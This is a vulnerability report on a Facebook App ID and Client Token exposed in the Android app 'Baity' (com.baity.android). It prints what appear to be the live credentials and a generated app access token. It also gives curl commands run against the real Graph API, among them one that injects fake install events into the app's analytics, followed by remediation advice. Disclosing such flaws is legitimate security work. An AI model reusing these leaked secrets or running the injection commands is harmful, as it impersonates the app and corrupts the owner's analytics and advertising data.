# Facebook API Key Exposure — Baity App v2

**Package:** `com.baity.android`  
**Severity:** **MEDIUM-HIGH**  
**Category:** OWASP Mobile Top 10 M5 (Insecure Authentication) / OWASP Web Top 10 A2 (Exposed Secrets)  
**Status:** ✅ CONFIRMED — Live exploitation successful

---

## 1. Finding

The Android application "Baity" (com.baity.android) exposes its **Facebook App ID** and **Client Token** in plaintext inside `res/values/strings.xml`. These credentials allow **any third party** to authenticate to Facebook's Graph API as the application itself.

| Secret | Value |
|--------|-------|
| Facebook App ID | `920300106849299` |
| Facebook Client Token | `fbec33235e62d5de158ec6d059f79e52` |
| App Name | Baity App v2 |
| App Category | Business |

---

## 2. Live Proof of Concept

All commands executed **live** against Facebook Graph API v21.0.

### 2.1 App Basic Info (Confirms Token is ACTIVE)

```bash
curl -s "https://graph.facebook.com/v21.0/920300106849299?access_token=920300106849299|fbec33235e62d5de158ec6d059f79e52"
```

**Response:**
```json
{
  "category": "Business",
  "link": "https://www.facebook.com/games/?app_id=920300106849299",
  "name": "Baity App v2",
  "id": "920300106849299"
}
```

### 2.2 App Access Token Generation

The Client Token can be used as a `client_secret` to generate a full **App Access Token**:

```bash
curl -s "https://graph.facebook.com/v21.0/oauth/access_token?client_id=920300106849299&client_secret=fbec33235e62d5de158ec6d059f79e52&grant_type=client_credentials"
```

**Response:**
```json
{
  "access_token": "920300106849299|gQ3QU0s2LIFeo9L6OAhLfyq6QCU",
  "token_type": "bearer"
}
```

### 2.3 Fake Event Injection (Facebook Analytics Manipulation)

An attacker can inject **fake install events** into the app's Facebook Analytics, corrupting business metrics:

```bash
curl -s -X POST "https://graph.facebook.com/v21.0/920300106849299/activities" \
  -d "event=MOBILE_APP_INSTALL" \
  -d "access_token=920300106849299|fbec33235e62d5de158ec6d059f79e52"
```

**Response:**
```json
{ "success": true }
```

This means anyone can:
- Inflate install counts artificially
- Corrupt Facebook Analytics dashboards  
- Manipulate ad performance data
- Send `CUSTOM_APP_EVENTS` with arbitrary payloads

---

## 3. Impact

| Attack Vector | Impact |
|--------------|--------|
| **App Impersonation** | Token allows API calls as "Baity App v2" on Facebook |
| **Analytics Manipulation** | Fake events (`MOBILE_APP_INSTALL`) injected with `{success:true}` |
| **OAuth Phishing** | App ID can be used in fake Facebook Login pages* |
| **Token Reuse** | Client Token acts as `client_secret` for OAuth2 |
| **Data Access** | App-level Graph API read access (name, category, config) |

*\* Requires additional social engineering to obtain User Access Tokens*

### 3.1 Who is at Risk?

- **Baity Business Team:** Fake analytics → wrong business decisions
- **End Users (indirectly):** If attacker creates phishing page using real App ID, users may enter credentials
- **Advertisers:** Corrupted attribution data affects ad spending

---

## 4. Root Cause

The Facebook **Client Token** is designed for desktop/native apps where the secret is not exposed. However, **mobile apps cannot securely store secrets** — any value in `strings.xml`, `res/`, or native libraries can be extracted via APK decompilation.

```
res/values/strings.xml (line ~38):
<string name="facebook_client_token">fbec33235e62d5de158ec6d059f79e52</string>
```

---

## 5. Remediation

1. **Immediate:** Rotate the Client Token at:
   `https://developers.facebook.com/apps/920300106849299/settings/basic/`
2. **Short-term:** Revoke the old token immediately after rotation
3. **Long-term:** Facebook Login for mobile should use **Code Flow** with PKCE — never embed Client Token in the app. The App ID alone is sufficient for mobile Facebook Login.
4. Consider **App Secrets / Backend Proxy**: Route Facebook API calls through a backend service that holds the secret server-side, not in the mobile APK.

---

## 6. References

- [Facebook Graph API Documentation](https://developers.facebook.com/docs/graph-api)
- [OWASP Mobile Top 10 - M5: Insecure Authentication](https://owasp.org/www-project-mobile-top-10/)
- [Facebook Client Token Best Practices](https://developers.facebook.com/docs/facebook-login/security/#client-token)

---

*Report generated: June 24, 2026*  
*Tooling: curl against live Facebook Graph API v21.0*
